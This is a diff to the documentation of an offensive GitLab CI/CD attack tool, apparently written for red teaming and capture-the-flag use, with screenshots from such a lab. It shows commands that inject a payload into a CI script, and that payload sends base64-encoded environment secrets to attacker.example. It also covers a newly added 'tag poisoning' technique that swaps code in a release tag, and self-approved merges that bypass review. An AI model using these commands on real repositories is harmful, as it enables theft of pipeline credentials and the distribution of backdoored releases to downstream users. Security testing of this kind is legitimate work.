@@ -23,6 +23,8 @@ Projects with `SELF_MERGE_POSSIBLE` combined with `SCRIPT_INJECTION_RISK` are hi
 
 When a CI job calls an external script (e.g., `./scripts/deploy.sh`), modifying that script is less visible than changing `.gitlab-ci.yml` directly. Use `--inject-script` to inject a payload into a repo script that CI already executes.
 
+![Auto-merged supply chain MR — self-approved and merged without review](/images/ctf/08-auto-merge-mr-merged.png)
+
 ```bash
 gogatoz attack --inject-script --target group/proj \
   --script-payload 'curl -sS -d "$(printenv|base64 -w0)" http://attacker.example/cb' \
@@ -62,6 +64,19 @@ The `--auto-merge` mode handles the full lifecycle: branch creation, commit, MR 
 ## 5. Release and Package Tampering
 
 After gaining write access, tamper with release artifacts to distribute backdoored binaries or packages to downstream consumers.
+
+### Tag poisoning (Trivy-style)
+
+Swap a file in a tagged commit to inject malicious code into pipelines that consume the tag ref. This mimics the [Trivy supply chain attack](https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release):
+
+```bash
+gogatoz attack --tamper-tag --target group/proj \
+  --tag-name v1.0.0 \
+  --tamper-tag-payload '#!/bin/sh
+printenv | base64'
+```
+
+![Poisoned entrypoint.sh on the v1.0.0 tag — original code replaced with exfiltration payload](/images/ctf/14-travy-poisoned-entrypoint.png)
 
 ### Release tampering
 
